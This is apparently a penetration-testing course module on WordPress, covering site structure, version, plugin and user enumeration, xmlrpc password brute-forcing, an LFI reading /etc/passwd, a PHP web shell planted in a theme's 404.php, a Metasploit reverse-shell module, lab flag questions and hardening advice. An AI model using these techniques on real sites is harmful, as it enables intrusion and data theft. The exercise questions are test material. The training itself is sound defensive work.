### Module Summary

As an information security professional, it is important to understand networking, operating systems, databases, web applications, scripting and programming languages, and more. During the course of your career, you will most likely come in contact with a variety of different types of web applications. As you become more experienced, you will start to see some of the web applications repeatedly, whether from the standpoint of an attacker or a defender. One of the most common web applications used by all sizes and types of organizations is WordPress. This module's goal is to impart a deep understanding of how WordPress websites function to better position them to attack and defend them. In this module, we will cover:

-   An overview of WordPress and the structure of a WordPress website
-   Manual and automated enumeration techniques
-   Attacks against WordPress users
-   Manual and automated attacks against a WordPress installation and the underlying webserver
-   Security hardening best practices to defend against the techniques covered in this module

This module is broken down into sections with accompanying hands-on exercises to practice each of the tactics and techniques we cover. The module ends with a practical hands-on skills assessment to gauge your understanding of the various topic areas.

You can start and stop the module at any time and pick up where you left off. There is no time limit or "grading," but you must complete all of the exercises and the skills assessment to receive the maximum number of cubes and have this module marked as complete in any paths you have chosen.

The module is classified as "Easy." However, it assumes a working knowledge of the Linux command line, an understanding of web applications and web requests, and a basic understanding of core networking concepts.

A firm grasp of the following modules can be considered prerequisites for successful completion of this module:

-   Introduction to Networking

### WordPress Overview
------------------

[WordPress](https://wordpress.org/)¬†is the most popular open source Content Management System (CMS), powering nearly one-third of all websites in the world. It can be used for multiple purposes, such as hosting blogs, forums, e-commerce, project management, document management, and much more. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. It has a large library of extensions called themes and plugins, both free and paid, that can be added to enhance the website. Some examples of plugins are WPForms, a robust contact form, MonsterInsights that interfaces with Google Analytics, and Constant Contact, a popular email marketing service. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend. Many hosting companies offer WordPress as an option when creating a new website and even assist with backend tasks such as security updates.

This module will cover a WordPress website's core structure, manual and automated enumeration techniques to uncover misconfigurations and vulnerabilities, and walk through a few common attacks. You will be given the opportunity to perform your own enumeration and attacks against a WordPress instance while working through the material in each section. The module will end with a Skills Assessment to tie together everything you have learned and complete all of the steps necessary to compromise a WordPress website and the underlying web server fully.

Happy hacking, and don't forget to think outside the box!

### What is a CMS?
--------------

A CMS is a powerful tool that helps build a website without the need to code everything from scratch (or even know how to write code at all). The CMS does most of the "heavy lifting" on the infrastructure side to focus more on the design and presentation aspects of the website instead of the backend structure. Most CMS' provide a rich¬†[What You See Is What You Get (WYSIWYG)](https://en.wikipedia.org/wiki/WYSIWYG)¬†editor where users can edit content as if they were working in a word processing tool such as Microsoft Word. Users can upload media directly from a media library interface instead of interacting with the webserver either from a management portal or via FTP or SFTP.

A CMS is made up of two key components:

-   A Content Management Application (CMA) - the interface used to add and manage content.
-   A Content Delivery Application (CDA) - the backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website.

A good CMS will provide extensibility, allowing you to add functionality and design elements to the site without needing to work with the website code, rich user management to provide fine-grained control over access permissions and roles, media management to allow the user to easily upload and embed photos and videos, and proper version control. When looking for a CMS, we should also confirm that it is well-maintained, receives periodic updates and upgrades, and has sufficient built-in security settings to harden the website from attackers.

## WordPress Structure

* * * * *

### Default WordPress File Structure
--------------------------------

WordPress can be installed on a Windows, Linux, or Mac OSX host. For this module, we will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at¬†`/var/www/html`.

Below is the directory structure of a default WordPress install, showing the key files and subdirectories necessary for the website to function properly.

#### File Structure

	tree -L 1 /var/www/html

```text
.
‚îú‚îÄ‚îÄ index.php
‚îú‚îÄ‚îÄ license.txt
‚îú‚îÄ‚îÄ readme.html
‚îú‚îÄ‚îÄ wp-activate.php
‚îú‚îÄ‚îÄ wp-admin
‚îú‚îÄ‚îÄ wp-blog-header.php
‚îú‚îÄ‚îÄ wp-comments-post.php
‚îú‚îÄ‚îÄ wp-config.php
‚îú‚îÄ‚îÄ wp-config-sample.php
‚îú‚îÄ‚îÄ wp-content
‚îú‚îÄ‚îÄ wp-cron.php
‚îú‚îÄ‚îÄ wp-includes
‚îú‚îÄ‚îÄ wp-links-opml.php
‚îú‚îÄ‚îÄ wp-load.php
‚îú‚îÄ‚îÄ wp-login.php
‚îú‚îÄ‚îÄ wp-mail.php
‚îú‚îÄ‚îÄ wp-settings.php
‚îú‚îÄ‚îÄ wp-signup.php
‚îú‚îÄ‚îÄ wp-trackback.php
‚îî‚îÄ‚îÄ xmlrpc.php
```

* * * * *

### Key WordPress Files
-------------------

The root directory of WordPress contains files that are needed to configure WordPress to function correctly.

-   `index.php`¬†is the homepage of WordPress.

-   `license.txt`¬†contains useful information such as the version WordPress installed.

-   `wp-activate.php`¬†is used for the email activation process when setting up a new WordPress site.

-   `wp-admin`¬†folder contains the login page for administrator access and the backend dashboard. Once a user has logged in, they can make changes to the site based on their assigned permissions. The login page can be located at one of the following paths:

    -   `/wp-admin/login.php`
    -   `/wp-admin/wp-login.php`
    -   `/login.php`
    -   `/wp-login.php`

This file can also be renamed to make it more challenging to find the login page.

-   `xmlrpc.php`¬†is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress¬†[REST API](https://developer.wordpress.org/rest-api/reference).

* * * * *

### WordPress Configuration File
----------------------------

-   The¬†`wp-config.php`¬†file contains information required by WordPress to connect to the database, such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

#### wp-config.php

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username */
define( 'DB_USER', 'username_here' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Authentication Unique Keys and Salts */
/* <SNIP> */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/** WordPress Database Table prefix */
$table_prefix = 'wp_';

/** For developers: WordPress debugging mode. */
/** <SNIP> */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

* * * * *

### Key WordPress Directories
-------------------------

-   The¬†`wp-content`¬†folder is the main directory where plugins and themes are stored. The subdirectory¬†`uploads/`¬†is usually where any files uploaded to the platform are stored. These directories and files should be carefully enumerated as they may lead to contain sensitive data that could lead to remote code execution or exploitation of other vulnerabilities or misconfigurations.

#### WP-Content

	tree -L 1 /var/www/html/wp-content

```text
.
‚îú‚îÄ‚îÄ index.php
‚îú‚îÄ‚îÄ plugins
‚îî‚îÄ‚îÄ themes
```

-   `wp-includes`¬†contains everything except for the administrative components and the themes that belong to the website. This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.

#### WP-Includes

	tree -L 1 /var/www/html/wp-includes

```text
.
‚îú‚îÄ‚îÄ <SNIP>
‚îú‚îÄ‚îÄ theme.php
‚îú‚îÄ‚îÄ update.php
‚îú‚îÄ‚îÄ user.php
‚îú‚îÄ‚îÄ vars.php
‚îú‚îÄ‚îÄ version.php
‚îú‚îÄ‚îÄ widgets
‚îú‚îÄ‚îÄ widgets.php
‚îú‚îÄ‚îÄ wlwmanifest.xml
‚îú‚îÄ‚îÄ wp-db.php
‚îî‚îÄ‚îÄ wp-diff.php
```

## WordPress User Roles

* * * * *

There are five types of users in a standard WordPress installation.

| Role | Description |
| --- | --- |
| Administrator | This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code. |
| Editor | An editor can publish and manage posts, including the posts of other users. |
| Author | Authors can publish and manage their own posts. |
| Contributor | These users can write and manage their own posts but cannot publish them. |
| Subscriber | These are normal users who can browse posts and edit their profiles. |

Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.

# Enumeration

## WordPress Core Version Enumeration

It is always important to know what type of application we are working with. An essential part of the enumeration phase is uncovering the software version number. This is helpful when searching for common misconfigurations such as default passwords that may be set for certain versions of an application and searching for known vulnerabilities for a particular version number. We can use a variety of methods to discover the version number manually. The first and easiest step is reviewing the page source code. We can do this by right-clicking anywhere on the current page and selecting "View page source" from the menu or using the keyboard shortcut¬†`[CTRL + U]`.

We can search for the¬†`meta generator`¬†tag using the shortcut¬†`[CTRL + F]`¬†in the browser or use¬†`cURL`¬†along with¬†`grep`¬†from the command line to filter for this information.

#### WP Version - Source Code

```html
...SNIP...
<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
...SNIP...
```

	curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'

```html
<meta name="generator" content="WordPress 5.3.3" />
```

Aside from version information, the source code may also contain comments that may be useful. Links to CSS (style sheets) and JS (JavaScript) can also provide hints about the version number.

#### WP Version - CSS

```html
...SNIP...
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
...SNIP...
```

#### WP Version - JS

```html
...SNIP...
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
...SNIP...
```

In older WordPress versions, another source for uncovering version information is the¬†`readme.html`¬†file in WordPress's root directory.

## Plugins and Themes Enumeration

We can also find information about the installed plugins by reviewing the source code manually by inspecting the page source or filtering for the information using¬†`cURL`¬†and other command-line utilities.

#### Plugins

	curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

```

#### Themes

	curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

```text

background: url("http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;
```

The response headers may also contain version numbers for specific plugins.

However, not all installed plugins and themes can be discovered passively. In this case, we have to send requests to the server actively to enumerate them. We can do this by sending a GET request that points to a directory or file that may exist on the server. If the directory or file does exist, we will either gain access to the directory or file or will receive a redirect response from the webserver, indicating that the content does exist. However, we do not have direct access to it.

	curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

```text
HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:08:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/
Content-Length: 356
Content-Type: text/html; charset=iso-8859-1
```

If the content does not exist, we will receive a¬†`404 Not Found error`.

	curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin

```text
HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:08:18 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

The same applies to installed themes.

To speed up enumeration, we could also write a simple bash script or use a tool such as¬†`wfuzz`¬†or¬†`WPScan`, which automate the process.

## Directory Indexing

Active plugins should not be our only area of focus when assessing a WordPress website. Even if a plugin is deactivated, it may still be accessible, and therefore we can gain access to its associated scripts and functions. Deactivating a vulnerable plugin does not improve the WordPress site's security. It is best practice to either remove or keep up-to-date any unused plugins.

The following example shows a disabled plugin.

![[plugin-deactivated3.png]]

If we browse to the plugins directory, we can see that we still have access to the¬†`Mail Masta`¬†plugin.

	http://<target>/wp-content/plugins/mail-masta/

![[plugin-mailmasta2.png]]

We can also view the directory listing using cURL and convert the HTML output to a nice readable format using¬†`html2text`.

	curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text

```text

This type of access is called¬†`Directory Indexing`. It allows us to navigate the folder and access files that may contain sensitive information or vulnerable code. It is best practice to disable directory indexing on web servers so a potential attacker cannot gain direct access to any files or folders other than those necessary for the website to function properly.

#### Questions

>Keep in mind the key WordPress directories discussed in the WordPress Structure section. Manually enumerate the target for any directories whose contents can be listed. Browse these directories and locate a flag with the file name flag.txt and submit its contents as the answer.

## User Enumeration

Enumerating a list of valid users is a critical phase of a WordPress security assessment. Armed with this list, we may be able to guess default credentials or perform a brute force password attack. If successful, we may be able to log in to the WordPress backend as an author or even as an administrator. This access can potentially be leveraged to modify the WordPress website or even interact with the underlying web server.

There are two methods for performing manual username enumeration.

* * * * *

### First Method
------------

The first method is reviewing posts to uncover the ID assigned to the user and their corresponding username. If we mouse over the post author link titled "by admin," as shown in the below image, a link to the user's account appears in the web browser's lower-left corner.

![[by-admin.png]]

The¬†`admin`¬†user is usually assigned the user ID¬†`1`. We can confirm this by specifying the user ID for the¬†`author`¬†parameter in the URL.

>http://blog.inlanefreight.com/?author=1

This can also be done with¬†`cURL`¬†from the command line. The HTTP response in the below output shows the author that corresponds to the user ID. The URL in the¬†`Location`¬†header confirms that this user ID belongs to the¬†`admin`¬†user.

#### Existing User

	curl -s -I -X GET http://blog.inlanefreight.com/?author=1

```text
HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://blog.inlanefreight.com/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The above¬†`cURL`¬†request then redirects us to the user's profile page or the main login page. If the user does not exist, we receive a¬†`404 Not Found error`.

#### Non-Existing User

	curl -s -I -X GET http://blog.inlanefreight.com/?author=100

```text
HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:47:14 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

* * * * *

### Second Method
-------------

The second method requires interaction with the¬†`JSON`¬†endpoint, which allows us to obtain a list of users. This was changed in WordPress core after version 4.7.1, and later versions only show whether a user is configured or not. Before this release, all users who had published a post were shown by default.

#### JSON Endpoint

	curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

```text
[
  {
    "id": 1,
    "name": "admin",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/admin/",
    <SNIP>
  },
  {
    "id": 2,
    "name": "ch4p",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/ch4p/",
    <SNIP>
  },
<SNIP>
```

#### Questions

>From the last cURL command, what user name is assigned to User ID 2?
>
> `ch4p`

### Login

* * * * *

Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the¬†`xmlrpc.php`¬†page.

If our POST request against¬†`xmlrpc.php`¬†contains valid credentials, we will receive the following output:

#### cURL - POST Request

	curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>

</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

If the credentials are not valid, we will receive a¬†`403 faultCode`¬†error.

#### Invalid Credentials - 403 Forbidden

	curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

```xml

        <member>
          <name>faultCode</name>

        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

These last few sections introduced several methods for performing manual enumeration against a WordPress instance. It is essential to understand manual methods before attempting to use automated tools. While automated tools greatly speed up the penetration testing process, it is our responsibility to understand their impact on the systems we are assessing. A solid understanding of manual enumeration methods will also assist with troubleshooting should any automated tools not function properly or provide unexpected output.

## WPScan Overview

* * * * *

### Using WPScan
------------

[WPScan](https://github.com/wpscanteam/wpscan)¬†is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable. It is installed by default on Parrot OS but can also be installed manually with¬†`gem`.

	gem install wpscan

Once the installation completes, we can issue a command such as¬†`wpscan --hh`¬†to verify the installation. This command will show us the usage menu with all of the available command-line switches.

	wpscan --hh

```text

		<SNIP>
```

There are various enumeration options that can be specified, such as vulnerable plugins, all plugins, user enumeration, and more. It is important to understand all of the options available to us and fine-tune the scanner depending on the goal (i.e., are we just interested to see if the WordPress site is using any vulnerable plugins, do we need to perform a full audit of all aspects of the site or are we just interested in creating a user list to use in a brute force password guessing attack?).

WPScan can pull in vulnerability information from external sources to enhance our scans. We can obtain an API token from¬†[WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for vulnerability and exploit proof of concepts (POC) and reports. The free plan allows up to 50 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to WPScan using the¬†`--api-token`¬†parameter.

Review the various WPScan options using the below Parrot instance by opening a shell and issuing the command¬†`wpscan --hh`.

## WPScan Enumeration

* * * * *

### Enumerating a Website with WPScan
---------------------------------

The¬†`--enumerate`¬†flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments¬†`--enumerate ap`. Let's run a normal enumeration scan against a WordPress website.

>Note: The default number of threads used is 5, however, this value can be changed using the "-t" flag.

# Exploitation

## Exploiting a Vulnerable Plugin

* * * * *

### Leveraging WPScan Results
-------------------------

The report generated by WPScan tells us that the website uses an older version of WordPress (5.3.2) and an outdated theme called¬†`Twenty Twenty`. WPScan identified two vulnerable plugins,¬†`Mail Masta 1.0`¬†and¬†`Google Review Slider`. This version of the¬†`Mail Masta`¬†plugin is known to be vulnerable to SQL Injection as well as Local File Inclusion (LFI). The report output also contains URLs to PoCs, which provide information on how to exploit these vulnerabilities.

Let's verify if the LFI can be exploited based on this exploit-db¬†[report](https://www.exploit-db.com/exploits/40290/). The exploit states that any unauthenticated user can read local files through the path:¬†`/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`.

#### LFI using Browser

	view-source:http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

![[WP_lfi.png]]

* * * * *

We can also validate this vulnerability using cURL on the command line.

#### LFI using cURL

	curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

```text

We have successfully validated the vulnerability using the data generated in the¬†`WPScan`¬†report. Now let's try it out ourselves!

#### Questions

>Use the same LFI vulnerability against your target and read the contents of the "/etc/passwd" file. Locate the only non-root user on the system with a login shell.

## Attacking WordPress Users

* * * * *

### WordPress User Bruteforce
-------------------------

WPScan can be used to brute force usernames and passwords. The scan report returned three users registered on the website:¬†`admin`,¬†`roger`, and¬†`david`. The tool uses two kinds of login brute force attacks,¬†`xmlrpc`¬†and¬†`wp-login`. The¬†`wp-login`¬†method will attempt to brute force the normal WordPress login page, while the¬†`xmlrpc`¬†method uses the WordPress API to make login attempts through¬†`/xmlrpc.php`. The¬†`xmlrpc`¬†method is preferred as it is faster.

## RCE via the Theme Editor

* * * * *

### Attacking the WordPress Backend
-------------------------------

With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on¬†`Appearance`¬†on the side panel and select¬†`Theme Editor`. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.

#### Theme Editor

![[Theme-Editor.png]]

We can see that the active theme is¬†`Transportex`¬†so an unused theme such as¬†`Twenty Seventeen`¬†should be chosen instead.

#### Selecting Theme

![[Twenty-Seventeen.png]]

Choose a theme and click on¬†`Select`. Next, choose a non-critical file such as¬†`404.php`¬†to modify and add a web shell.

#### Twenty Seventeen Theme - 404.php

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

The above code should allow us to execute commands via the GET parameter¬†`cmd`. In this example, we modified the source code of the¬†`404.php`¬†page and added a new function called¬†`system()`. This function will allow us to directly execute operating system commands by sending a GET request and appending the¬†`cmd`¬†parameter to the end of the URL after a question mark¬†`?`¬†and specifying an operating system command. The modified URL should look like this¬†`404.php?cmd=id`.

We can validate that we have achieved RCE by entering the URL into the web browser or issuing the¬†`cURL`¬†request below.

#### RCE

	curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

```text
uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
<SNIP>
```

#### Questions

>Use the credentials for the admin user [admin:sunshine1] and upload a webshell to your target. Once you have access to the target, obtain the contents of the "flag.txt" file in the home directory for the "wp-user" directory.

## Attacking WordPress with Metasploit

* * * * *

### Automating WordPress Exploitation
---------------------------------

We can use the¬†Metasploit Framework (MSF)¬†to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.

We can quickly start¬†`MSF`¬†by issuing the following command:

#### Starting Metasploit Framework

	msfconsole

To obtain the reverse shell, we can use the¬†`wp_admin_shell_upload`¬†module. We can easily search for it inside¬†`MSF`:

#### MSF Search

	search wp_admin

```text
Matching Modules
================

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```

The number¬†`0`¬†in the search results represents the ID for the suggested modules. From here on, we can specify the module by its ID number to save time.

#### Module Selection

	use 0

```text
msf5 exploit(unix/webapp/wp_admin_shell_upload) >
```

* * * * *

#### Module Options

Each module offers different settings options that we can use to assign precise specifications to¬†`MSF`¬†to ensure the attack's success. We can list these options by issuing the following command:

#### List Options

	options

```text
Module options (exploit/unix/webapp/wp_admin_shell_upload):

```

* * * * *

### Exploitation
------------

After using the¬†`set`¬†command to make the necessary modifications, we can use the¬†`run`¬†command to execute the module. If all of our parameters are set correctly, it will spawn a reverse shell on the target upon execution.

#### Set Options

	set rhosts blog.inlanefreight.com
	set username admin
	set password Winter2020
	set lhost 10.10.16.8
	run

```text

# Security Measures

## WordPress Hardening

* * * * *

### Best Practices
--------------

Below are some best practices for preventing attacks against a WordPress site.

* * * * *

### Perform Regular Updates
-----------------------

This is a key principle for any application or system and can greatly reduce the risk of a successful attack. Make sure that WordPress core, as well as all installed plugins and themes, are kept up-to-date. Researchers continuously find flaws in third-party WordPress plugins. Some hosting providers will even perform continuous automatic updates of WordPress core. The WordPress admin console will usually prompt us when plugins or themes need to be updated or when WordPress itself requires an upgrade. We can even modify the¬†`wp-config.php`¬†file to enable automatic updates by inserting the following lines:

```php
define( 'WP_AUTO_UPDATE_CORE', true );
```

```php
add_filter( 'auto_update_plugin', '__return_true' );
```

```php
add_filter( 'auto_update_theme', '__return_true' );
```

* * * * *

### Plugin and Theme Management
---------------------------

Only install trusted themes and plugins from the WordPress.org website. Before installing a plugin or theme, check its reviews, popularity, number of installs, and last update date. If either has not been updated in years, it could be a sign that it is no longer maintained and may suffer from unpatched vulnerabilities. Routinely audit your WordPress site and remove any unused themes and plugins. This will help to ensure that no outdated plugins are left forgotten and potentially vulnerable.

* * * * *

### Enhance WordPress Security
--------------------------

Several WordPress security plugins can be used to enhance the website's security. These plugins can be used as a Web Application Firewall (WAF), a malware scanner, monitoring, activity auditing, brute force attack prevention, and strong password enforcement for users. Here are a few examples of popular WordPress security plugins.

#### [Sucuri Security](https://wordpress.org/plugins/sucuri-scanner/)

-   This plugin is a security suite consisting of the following features:
    -   Security Activity Auditing
    -   File Integrity Monitoring
    -   Remote Malware Scanning
    -   Blacklist Monitoring.

#### [iThemes Security](https://wordpress.org/plugins/better-wp-security/)

-   iThemes Security provides 30+ ways to secure and protect a WordPress site such as:
    -   Two-Factor Authentication (2FA)
    -   WordPress Salts & Security Keys
    -   Google reCAPTCHA
    -   User Action Logging

#### [Wordfence Security](https://wordpress.org/plugins/wordfence/)

-   Wordfence Security consists of an endpoint firewall and malware scanner.
    -   The WAF identifies and blocks malicious traffic.
    -   The premium version provides real-time firewall rule and malware signature updates
    -   Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.

* * * * *

### User Management
---------------

Users are often targeted as they are generally seen as the weakest link in an organization. The following user-related best practices will help improve the overall security of a WordPress site.

-   Disable the standard¬†`admin`¬†user and create accounts with difficult to guess usernames
-   Enforce strong passwords
-   Enable and enforce two-factor authentication (2FA) for all users
-   Restrict users' access based on the concept of least privilege
-   Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed

* * * * *

### Configuration Management
------------------------

Certain configuration changes can increase the overall security posture of a WordPress installation.

-   Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
-   Limit login attempts to prevent password brute-forcing attacks
-   Rename the¬†`wp-admin.php`¬†login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses

# Skills Assessment

## Skills Assessment - WordPress

* * * * *

We have reached the end of the module!

Now let's put all of the new skills we have learned into practice. This final skills assessment will test each of the topics introduced in this module against a new WordPress target.

* * * * *

### Scenario
--------

You have been contracted to perform an external penetration test against the company¬†`INLANEFREIGHT`¬†that is hosting one of their main public-facing websites on WordPress.

Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.

#### Questions

>Identify the WordPress version number.

>Identify the WordPress theme in use.

>Submit the contents of the flag file in the directory with directory listing enabled.

>Identify the only non-admin WordPress user.

>Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.

>What is the version number of the plugin vulnerable to an LFI?

>Use the LFI to identify a system user whose name starts with the letter "f".

>Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.
